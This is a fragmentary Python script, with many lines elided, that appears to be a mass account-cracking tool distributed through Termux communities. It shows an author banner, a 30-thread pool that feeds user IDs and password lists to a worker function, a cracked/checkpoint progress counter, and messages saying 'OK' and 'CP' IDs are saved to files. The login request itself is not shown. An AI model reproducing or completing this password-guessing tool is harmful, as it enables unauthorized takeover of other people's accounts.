...
logo = ("""\033[1;37m
 ...
 YP   YP YP   YP `8888Y' YP   YP VP   V8P 
  ...
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                     
  Tools Create By Asraful islam Alamin
  My Github Account KgAlamin
  My Fb Group Alamin Termux Helping Zone                                                                                      
  My Id Name Hasa N
  Tools Status Random
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
""")
...
def fuck():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        for love in user:
            ...
            asha.submit(Alamin,uid,pwx,tl)
    print('-------------------')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as Alamin-OK.txt')
    print(' [✓] CP Id Save as Alamin-CP.txt')
    print('-------------------')
def Alamin(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[Alamin]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
